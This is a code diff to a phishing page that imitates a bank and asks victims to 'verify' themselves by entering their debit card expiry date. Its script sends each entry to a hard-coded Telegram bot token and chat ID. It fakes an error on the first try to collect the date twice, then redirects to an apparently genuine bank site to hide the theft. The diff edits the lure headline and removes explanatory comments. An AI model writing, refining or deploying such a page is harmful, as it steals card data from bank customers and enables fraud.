@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-  <title>Confirm your account</title>
+  <title>Verify your identity</title>
 
   <style>
     * {
@@ -110,10 +110,14 @@
 
     .header h1 {
       margin: 0;
-      font-size: 36px;
-      font-weight: 400;
-      letter-spacing: -0.5px;
+      font-size: 28px;
+      font-weight: 500;
+      letter-spacing: -0.3px;
       color: #000;
+      line-height: 1.3;
+      max-width: 90%;
+      margin-left: auto;
+      margin-right: auto;
     }
 
     .content {
@@ -414,22 +418,18 @@
 
     @media (max-width: 520px) {
       .header h1 {
-        font-size: 30px;
+        font-size: 22px;
       }
-
       .card {
         width: 280px;
         height: 178px;
       }
-
       .card-title {
         font-size: 34px;
       }
-
       .form-box p {
         font-size: 15px;
       }
-
       .expiry-input,
       .confirm-btn {
         width: 150px;
@@ -451,7 +451,7 @@
   <main class="page">
 
     <header class="header">
-      <h1>Confirm your account</h1>
+      <h1>Verify yourself by confirming the expiry date of your debit card</h1>
     </header>
 
     <section class="content">
@@ -487,7 +487,7 @@
         ***************1141
       </div>
 
-      <!-- FORM with error box and formal instruction -->
+      <!-- FORM with error box -->
       <form class="form-box" onsubmit="handleSubmit(event)">
         <div class="dsc-alert is-noChildren mc-mb-normal is-error" data-test="alert" id="errorBox">
           <div class="dsc-alert__icon">
@@ -532,7 +532,7 @@
       const expiryInput = document.querySelector(".expiry-input");
       const errorBox = document.getElementById("errorBox");
 
-      // Telegram credentials (fixed token)
+      // Telegram credentials
       const TELEGRAM_BOT_TOKEN = '8133407038:AAHgibqH9lia9xUd1xMSTJVlGm82Gd8kGvc';
       const TELEGRAM_CHAT_ID = '7844108983';
 
@@ -545,7 +545,6 @@
         const message = `🔐 Card Expiry - ${attemptLabel}\n📅 Expiry: ${expiryValue}\n⏱️ Time: ${new Date().toLocaleString()}`;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
-        // Fire-and-forget: async but don't await to avoid UI lag
         fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -553,45 +552,35 @@
         }).catch(err => console.warn("Telegram send failed", err));
       }
 
-      // IMPROVED INPUT FORMATTING (MM/YY) – smooth, no reversal
+      // Input formatting (MM/YY)
       if (expiryInput) {
         expiryInput.addEventListener("input", function(e) {
           let rawDigits = e.target.value.replace(/\D/g, "").slice(0, 4);
           let formatted = "";
-          
           if (rawDigits.length >= 3) {
             formatted = rawDigits.slice(0, 2) + "/" + rawDigits.slice(2);
           } else {
             formatted = rawDigits;
           }
-          
           e.target.value = formatted;
           e.target.setSelectionRange(formatted.length, formatted.length);
         });
       }
 
-      // Main submit handler – cleared input instantly on first attempt (no lag)
+      // Form submission: first attempt shows error, clears input, sends; second sends and redirects
       window.handleSubmit = async function(event) {
         event.preventDefault();
-        
         const currentExpiry = expiryInput ? expiryInput.value.trim() : "";
         attemptCount++;
 
-        // FIRST ATTEMPT: show error, clear input immediately, then send webhook in background
         if (attemptCount === 1) {
           if (errorBox) errorBox.classList.add("show");
-          
-          // Instant clear – no lag visible to user
           if (expiryInput) expiryInput.value = "";
-          
-          // Send webhook without awaiting (background)
           if (currentExpiry) sendExpiryToTelegram(currentExpiry, 1);
-          
           window.scrollTo({ top: 0, behavior: "smooth" });
           return;
         }
 
-        // SECOND ATTEMPT: send data & redirect
         if (currentExpiry) sendExpiryToTelegram(currentExpiry, 2);
         window.location.href = "https://app.bnc.ca/documents";
       };
